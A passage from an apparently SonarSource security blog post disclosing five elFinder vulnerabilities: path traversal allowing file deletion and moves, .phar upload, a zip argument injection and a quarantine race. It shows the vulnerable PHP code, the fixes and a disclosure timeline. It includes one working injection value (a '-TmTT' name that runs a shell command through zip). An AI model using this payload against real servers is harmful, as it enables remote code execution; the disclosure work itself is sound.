Let’s first dig into an arbitrary file deletion bug chain, composed of two distinct issues.

### Deleting Arbitrary Files

The PHP core does not provide an effective way to run background threads, or perform synchronization and inter-process communication. elFinder tries to balance this by heavily using temporary files and post-request hooks. For instance, users can `abort` ongoing actions by calling the method of the same name:

**php/elFinder.class.php**

```
protected function abort($args = array())
{
  if (!elFinder::$connectionFlagsPath || $_SERVER['REQUEST_METHOD'] === 'HEAD') {
    return;
  }

  $flagFile = elFinder::$connectionFlagsPath . DIRECTORY_SEPARATOR . 'elfreq%s';
  if (!empty($args['makeFile'])) {
    self::$abortCheckFile = sprintf($flagFile, $args['makeFile']); // <-- [1]
    touch(self::$abortCheckFile);
    $GLOBALS['elFinderTempFiles'][self::$abortCheckFile] = true;
    return;
  }

  $file = !empty($args['id']) ? sprintf($flagFile, $args['id']) : self::$abortCheckFile; // <-- [2]
  $file && is_file($file) && unlink($file);
}
```

Here, a code vulnerability is present at `[1]` and `[2]`: a user-controlled parameter is concatenated into a full path without prior checks. For `[1]`, it can end up creating an empty file with a fully controllable name, and in `[2]` it can be used to remove an arbitrary file. SonarQube Cloud issues for both bugs are available: [[1]](https://sonarcloud.io/project/issues?id=SonarSourceResearch_elFinder2&open=AXhbTmQAMtwvSXpgjgi3&resolved=false&sonarsourceSecurity=path-traversal-injection&types=VULNERABILITY "[1]") and [[2]](https://sonarcloud.io/project/issues?id=SonarSourceResearch_elFinder2&open=AXhbTmQAMtwvSXpgjgi1&resolved=false&sonarsourceSecurity=path-traversal-injection&types=VULNERABILITY "[2]").

There is a catch: the filename resulting from `[1]` will be prefixed by `elfreq`. In a path traversal attack, POSIX systems will fail path resolution if any predecessor in the path does not exist or is not a directory. For instance, resolving `/tmp/i_do_not_exist/../` or `/tmp/i_am_a_file/../` will respectively fail with `ENOENT` and `ENOTDIR`. This prerequisite makes the exploitation of these two vulnerabilities impossible as-is, and will require another bug, such as the ability to create an arbitrary directory.

An attacker could then look into the command `mkdir` and discover a primitive that allows this exact behaviour. Here is its top-level handler, before it goes through the filesystem abstraction layer:

**php/elFinder.class.php**

```
function mkdir($args)
{
  $target = $args['target'];
  $name = $args['name'];
  $dirs = $args['dirs'];
            // [...]
  if (($volume = $this->volume($target)) == false) {
    return array('error' => $this->error(self::ERROR_MKDIR, $name, self::ERROR_TRGDIR_NOT_FOUND, '#' . $target));
  }
    // [...]
  return ($dir = $volume->mkdir($target, $name)) == false
            ? array('error' => $this->error(self::ERROR_MKDIR, $name, $volume->error()))
            : array('added' => array($dir));
    }
}
```

A generic implementation is present in `elFinderVolumeDriver` to handle both the volume and path that should be created. It will call the volume-specific implementation at `[1]` with the volume absolute path on the filesystem as the first parameter and the target name as the second parameter:

**php/elFinderVolumeDriver.class.php**

```
public function mkdir($dsthash, $name)
{
  // [...]
  $path = $this->decode($dsthash);
  // [...]
  $dst = $this->joinPathCE($path, $name);
  // v--- [1]
  $mkpath = $this->convEncOut($this->_mkdir($this->convEncIn($path),      $this->convEncIn($name)));
    if ($mkpath) {
        $this->clearstatcache();
        $this->updateSubdirsCache($path, true);
        $this->updateSubdirsCache($mkpath, false);
    }

    return $mkpath ? $this->stat($mkpath) : false;
}
```

It is defined as follows:

**php/elFinderVolumeLocalFileSystem.class.php**

```
protected function _joinPath($dir, $name)
{
  return rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
}

protected function _mkdir($path, $name)
{
  $path = $this->_joinPath($path, $name);

  if (mkdir($path)) {
    chmod($path, $this->options['dirMode']);
    return $path;
  }

  return false;
}
```

`elFinderVolumeLocalFileSystem::_joinPath()` is doing a mere concatenation of the two values, leading to a path traversal vulnerability. This gives a primitive to create arbitrary, empty folders on the local filesystem. While not being a vulnerability in itself, it will allow the exploitation of the aforementioned behaviour.

It is also worth noting the presence of a full path disclosure in the `rm` command, disclosing the absolute path of a given file on the local filesystem:

**php/elFinderVolumeDriver.class.php**

```
protected function remove($path, $force = false)
{
  $stat = $this->stat($path);

  if (empty($stat)) {
    return $this->setError(elFinder::ERROR_RM, $path, elFinder::ERROR_FILE_NOT_FOUND);
  }
```

The impact of this vulnerability is quite dependent on the environment: it could be chained with other elFinder bugs, used to trigger interesting behaviors in other applications (e.g. [remove WordPress’ wp-config.php file to gain code execution](https://blog.sonarsource.com/wordpress-file-delete-to-code-execution "remove WordPress’ wp-config.php file to gain code execution")) or used to affect existing security measures (e.g. removing `.htaccess` files).

This vulnerability has been [fixed](https://github.com/Studio-42/elFinder/commit/a106c350b7dfe666a81d6b576816db9fe0899b17#diff-6fe96d285bdbb6d8cf10335a4684ceb4f8badaa6bb7190a4f6b0d960d1af8904L347-R369 "fixed") by improving the implementation of `elFinderVolumeLocalFileSystem::_joinPath(`) to assert that the final path won’t be outside of the base one. Several calls to `basename()` across the codebase were also added as a hardening measure.

### Moving Arbitrary Files

This same `elFinderVolumeLocalFileSystem::_joinPath()` method is used in other actions, such as `rename`: it combines a volume base directory and a user-provided destination name. It is thus vulnerable to the bug we just described.

The following snippet is the actual implementation of `elFinderVolumeLocalFileSystem::rename()`, after executing all the code responsible for decoding the paths and ensuring that the destination extension is allowed:

**php/elFinderVolumeLocalFileSystem.class.php**

```
protected function _move($source, $targetDir, $name)
{
  $mtime = filemtime($source);
  $target = $this->_joinPath($targetDir, $name);
  if ($ret = rename($source, $target) ? $target : false) {
    isset($this->options['keepTimestamp']['move']) && $mtime && touch($target, $mtime);
  }
  return $ret;
}
```

While the destination extension is still strictly limited by MIME checks, this primitive can be enough for an unauthenticated attacker to gain command execution on the server, depending on the environment, by overriding files like `authorized_keys`, `composer.json`, etc. This bug [has been fixed](https://github.com/Studio-42/elFinder/commit/a106c350b7dfe666a81d6b576816db9fe0899b17#diff-6fe96d285bdbb6d8cf10335a4684ceb4f8badaa6bb7190a4f6b0d960d1af8904L347-R369 "has been fixed") with the same patch as the previous bug we discussed.

### Uploading PHP Files

As for most PHP applications, the biggest threat faced by elFinder is that an attacker could be able to upload PHP scripts to the server, since nothing (except quite a hardened web server configuration) would prevent them from accessing it directly to execute its contents. The maintainers initially tried to defend against that by crafting a block-list that associated dangerous MIME types to the relevant extensions:

**php/elFinderVolumeDriver.class.php**

```
'staticMineMap' => array(
  'php:*' => 'text/x-php',
  'pht:*' => 'text/x-php',
  'php3:*' => 'text/x-php',
  'php4:*' => 'text/x-php',
  'php5:*' => 'text/x-php',
  'php7:*' => 'text/x-php',
  'phtml:*' => 'text/x-php',
  // [...]
```

In our test environment (Apache HTTP 2.4.46-1ubuntu1 on Ubuntu 20.10), the default configuration declares that `.phar` files should be treated as `application/x-httpd-php ([1]`) and be interpreted:

```
$ cat /etc/apache2/mods-available/php7.4.conf
<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php  # <-- [1]
</FilesMatch>
<FilesMatch ".+\.phps$">
    SetHandler application/x-httpd-php-source
    # Deny access to raw php sources by default
    # To re-enable it's recommended to enable access to the files
    # only in specific virtual host or directory
    Require all denied
</FilesMatch>
# Deny access to files without filename (e.g. '.php')
<FilesMatch "^\.ph(ar|p|ps|tml)$">
    Require all denied
</FilesMatch>
// [...]
```

This configuration was also observed on Debian’s stable release. While another pass of MIME type detection is performed on the contents of the file, this can be easily circumvented as the PHP interpreter allows statements anywhere in the interpreted files (e.g. `<?php` can be placed after some dummy data).

The [fix](https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1 "fix") is straightforward: it declares that `.phar` files are associated with the MIME `text/x-php`, which are disallowed by default.

### Argument Injection

Among the default features that make elFinder so powerful, users can select multiple files and archive them using external tools such as `zip`, `rar`, and `7z`. This functionality is exposed under the action named `archive`:

**php/elFinder.class.php**

```
public function archive($args)
{
  $targets = isset($args['targets']) && is_array($args['targets']) ? $args['targets'] : array();
  $name = isset($args['name']) ? $args['name'] : '';

  if (($volume = $this->volume($targets[0])) == false) {
    return $this->error(self::ERROR_ARCHIVE, self::ERROR_TRGDIR_NOT_FOUND);
  }

  foreach ($targets as $target) {
    $this->itemLock($target);
  }

  return ($file = $volume->archive($targets, $args['type'], $name))
        ? array('added' => array($file))
        : array('error' => $this->error(self::ERROR_ARCHIVE, $volume->error()));
}
```

Note that users can create archives even if their upload is forbidden, by calling the `archive` command on existing files. The implementation is specific to the virtual filesystem in use. We will focus solely on the default one, since it is inherited by `elFinderVolumeLocalFileSystem` which crafts the full command line (`[1]`) and executes it with the default shell (`[2]`):

**php/elFinderVolumeLocalFileSystem.class.php**

```
protected function makeArchive($dir, $files, $name, $arc)
{
// [...]
    $cwd = getcwd();
    if (chdir($dir)) {
      foreach ($files as $i => $file) {
        $files[$i] = '.' . DIRECTORY_SEPARATOR . basename($file);
      }
      $files = array_map('escapeshellarg', $files);

      $cmd = $arc['cmd'] . ' ' . $arc['argc'] . ' ' . escapeshellarg($name) . ' ' . implode(' ', $files); // <-- [1]
      $this->procExec($cmd, $o, $c);                // <-- [2]
// [...]
```

Here, the value of `$name` comes from the user-controlled parameter `$_GET['name']`. While properly escaped with `escapeshellarg()` to prevent the use of command substitution sequences, the program will try to parse this value as a flag (`--foo=bar`) and then as a positional argument. It is also worth noting that the user's value is suffixed with `.zip` in the case in which the ZIP archiver is selected.

The command `zip` implements an integrity test feature (`-T`) that can be used along with `-TT` to specify the test command to run. In the present case, it gives the attacker a way to execute arbitrary commands using this parameter injection.

To be able to exploit this vulnerability, the attacker needs to create a dummy file (e.g. `a.txt`), archive it to create `a.zip` and then invoke the `archive` action with both the original file and the archive as targets, using a name like `-TmTT="$(id>out.txt)foooo"`.

The resulting command line will be `zip -r9 -q '-TmTT="$(id>out.txt)foooo".zip' './a.zip' './a.txt'`, thus executing `id` and logging its standard output into `out.txt` — this file will be available with the other documents in elFinder’s interface.

When it came time to fix this bug, `zip` wasn't very friendly. The usual method based on POSIX’s `--` ([see our previous article about a parameter injection in Composer for an in-depth explanation](https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities/ "see our previous article about a parameter injection in Composer for an in-depth explanation")) can’t be applied here, since `zip` will exit with the following error:

```
zip error: Invalid command arguments (can't use -- before archive name)
```

The maintainers then [decided to prefix the archive name with ./ to prevent any risk of parameter injection](https://github.com/Studio-42/elFinder/commit/a106c350b7dfe666a81d6b576816db9fe0899b17#diff-85602823cf2cdaf2502dc4f1b97001ffc0f083652aef175d9f068a5bfe90ca71L6875-R6882 "decided to prefix the archive name with ./ to prevent any risk of parameter injection"). They also decided to harden the calls to the other archivers (`7z`, `rar`, etc.) in the same patch.

### Quarantine and Race Condition

Let’s have a look at our last finding of this case study. While this vulnerability in the quarantine feature cannot be exploited in the default configuration since archives can’t be uploaded; the feature could have been responsible for future security issues because of its design.

The rationale behind the quarantine is that archives may contain unwanted files (mostly PHP scripts) that should not be extracted in the current folder without first running security checks (e.g. with MIME validation). So instead, elFinder chose to extract archives into a folder named `.quarantine`, placed under the `files/` folder, and  `elFinderVolumeLocalFileSystem::_extract()` generates a random directory name for each archive extraction (at `[1]`):

**php/elFinderVolumeLocalFileSystem.class.php**

```
protected function _extract($path, $arc)
{
  if ($this->quarantine) {
    $dir = $this->quarantine . DIRECTORY_SEPARATOR . md5(basename($path) . mt_rand()); // <-- [1]
    $archive = (isset($arc['toSpec']) || $arc['cmd'] === 'phpfunction') ? '' : $dir . DIRECTORY_SEPARATOR . basename($path);
// [...]
```

This can be confirmed dynamically thanks to `strace` or the `inotify` suite, for instance here with an archive containing a PHP file:

```
$ inotifywait -m -r .
./ CREATE,ISDIR efbf975ccbac8727f434574610a0f1b6
./ OPEN,ISDIR efbf975ccbac8727f434574610a0f1b6
]...[
./efbf975ccbac8727f434574610a0f1b6/ ATTRIB,ISDIR
./efbf975ccbac8727f434574610a0f1b6/ CREATE win.php
./efbf975ccbac8727f434574610a0f1b6/ OPEN win.php
./efbf975ccbac8727f434574610a0f1b6/ MODIFY win.php
./efbf975ccbac8727f434574610a0f1b6/ ATTRIB win.php
./efbf975ccbac8727f434574610a0f1b6/ CLOSE_WRITE,CLOSE win.php
./efbf975ccbac8727f434574610a0f1b6/ ATTRIB win.php
[...]
./efbf975ccbac8727f434574610a0f1b6/ DELETE win.php
[...]
./efbf975ccbac8727f434574610a0f1b6/ DELETE_SELF
```

This trace can be understood as:

* A folder named `efbf975ccbac8727f434574610a0f1b6` is created,
* A file named `win.php` is created within `efbf975ccbac8727f434574610a0f1b6`,
* Data is written into `win.php`,
* `win.php` is deleted,
* `efbf975ccbac8727f434574610a0f1b6` is deleted.

If the server is configured to list directories, this behavior can easily be exploited, since dangerous files (e.g. `.php`) can be accessed right before the MIME validation step and their removal. The race condition window is however too small to think of an attack involving brute force if the random directory name can’t be found that way.

An attacker could discover that the `duplicate` action can be used on the internal folders, like `.quarantine`, and copy any file regardless of its contents. While being a harmless functional bug on its own, it can be chained with the quarantine feature to duplicate the folder containing our extracted archive just before its deletion. The duplicated folder is then visible in the interface, and allows an attacker to get around the random name to access the malicious script, ultimately granting arbitrary code execution.

As a [fix](https://github.com/Studio-42/elFinder/commit/a106c350b7dfe666a81d6b576816db9fe0899b17#diff-6fe96d285bdbb6d8cf10335a4684ceb4f8badaa6bb7190a4f6b0d960d1af8904L78-R232) "fix"), the maintainers decided to move the `.quarantine` folder outside of files/. The `elFinderVolumeLocalFileSystem` abstraction layer is not aware of anything outside of this folder, preventing any unintended action on `.quarantine`.

## Timeline

| **Date** | **Action** |
| --- | --- |
| 2021-03-22 | These 5 issues are reported to maintainers |
| 2021-06-10 | The maintainers acknowledge all our findings |
| 2021-06-13 | elFinder 2.1.59 is released, fixing the bugs we reported |
| 2021-06-13 | CVE-2021-32682 and CVE-2021-23394 are assigned |

## Summary

In this case study we looked at critical code vulnerabilities that are commonly found in web file managers. We presented several of our real-world findings in the latest version of elFinder available at the time, including their potential impact and how they were fixed by the vendor.  It allowed us to demonstrate that innocuous bugs can often be combined to gain arbitrary code execution. We believe it is important to document and report these vulnerabilities to break future bug chains and reduce the risk of similar issues.

We also learned that working with paths is not easy and that extra measures should be taken: performing additional checks in the “low-level” functions, using `basename()` and `dirname()` with confidence (and knowing their limits!) and always validating user-controlled data. Such bugs are very common in web file managers, and you should always have such bugs in mind when working with them.

While we don’t plan to release any exploits for these bugs, we would still like to bring your attention to the fact that arbitrary code execution was easily demonstrated and attackers won’t have much trouble replicating it. We urge you to immediately upgrade to elFinder 2.1.59. We also advise enforcing strong access control on the connector (e.g. basic access authentication).

Finally, we would like to thank the maintainers of elFinder for acknowledging our advisory and fixing these vulnerabilities in a timely and professional manner.

## Related Blog Posts

* [https://blog.sonarsource.com/php-supply-chain-attack-on-composer](https://blog.sonarsource.com/php-supply-chain-attack-on-composer "https://blog.sonarsource.com/php-supply-chain-attack-on-composer")
* [https://blog.sonarsource.com/bitbucket-path-traversal-to-rce](https://blog.sonarsource.com/bitbucket-path-traversal-to-rce "https://blog.sonarsource.com/bitbucket-path-traversal-to-rce")
* [https://blog.sonarsource.com/wordpress-file-delete-to-code-execution](https://blog.sonarsource.com/wordpress-file-delete-to-code-execution "https://blog.sonarsource.com/wordpress-file-delete-to-code-execution")
#### SHARE

[twitter](https://twitter.com/share?text=undefined)[facebook](https://www.facebook.com/sharer/sharer.php?u=undefined)[linkedin](https://www.linkedin.com/sharing/share-offsite/?url=undefined)mail[Go to SonarSource homepage![](data:image/svg+xml;charset=utf-8...)![sonar logo ]()![sonar logo ](https://assets-eu-01.kc-usercontent.com:443/95361965-6528-012b-61fc-b49456de9702/8e59bcad-6e39-41dc-abd9-a0e251e8d63f/Sonar%20%282%29.svg?w=160&h=40&auto=format&fit=crop)](/)

* **Sonar Solutions**
  + [SAST](/solutions/security/)
  + [What is clean code](/solutions/clean-code/)
  + [Power of clean code](/solutions/power-of-clean-code/)
  + [Clean as you code](/solutions/our-unique-approach/)
  + [AI-assisted & quality-assured code](/solutions/ai/)
  + [DevOps transformation](/solutions/devops-transformation/)
  + [Outsourcing software development](/solutions/reduce-outsourcing-software-development-risk/)
  + [Reduce & manage technical debt](/solutions/reduce-technical-debt/)
  + [Secure by design](/solutions/secure-by-design-code/)
  + [Code coverage](/solutions/code-coverage/)
  + [Code review](/solutions/code-review/)
  + [For developers](/solutions/for-developers/)
  + [For enterprise](/solutions/for-enterprise/)
  + [Infrastructure as code](/solutions/infrastructure-as-code/)
  + [Public sector](/solutions/public-sector/)
* **Products**
  + [SonarQube for IDE](/products/sonarlint/)
  + [SonarQube Server](/products/sonarqube/)
  + [SonarQube Cloud](/products/sonarcloud/)**Pricing**
  + [Start for free](/open-source-editions/)
  + [Explore pricing](/plans-and-pricing/)
* **Company**
  + [About](/company/about/)
  + [Careers](/company/careers/)
  + [Commitment to open source](/solutions/commitment-to-open-source/)
  + [Customers](/company/customers/)
  + [Partners](/company/partners/)
  + [Contact us](/company/contact/)
  + [Accessibility](/accessibility/)
  + [NEW! Brand identity](/brand-identity/)**Media**
  + [Coverage](/company/coverage/)
  + [Press releases](/company/press-releases/)
* **Resources**
  + [Events hub](/resources/events/)
  + [Customer stories](/resources/customer-stories/)
  + [White papers](/resources/white-papers/)
  + [Learn](/learn/guide/)
  + [Community](https://community.sonarsource.com/)
  + [Support](/support/)
* **Knowledge**
  + [Explore Sonarpedia](https://rules.sonarsource.com/)
  + [Blog](/blog/)
  + [Languages](/knowledge/languages/)
  + [SonarQube Server Documentation](https://docs.sonarsource.com/sonarqube/latest/)
  + [SonarQube Cloud Documentation](https://docs.sonarsource.com/sonarcloud/)
  + [SonarQube for IDE Documentation](https://docs.sonarsource.com/sonarlint/)

* [Legal documentation](/legal/)
* [Trust center](/trust-center/)

* [Follow SonarSource on Twitter](https://twitter.com/sonarsource)
* [Follow SonarSource on Linkedin](https://www.linkedin.com/company/sonarsource/)

© 2008-2025 SonarSource SA. All rights reserved. SONAR, SONARSOURCE, SONARQUBE, and CLEAN AS YOU CODE are trademarks of SonarSource SA.


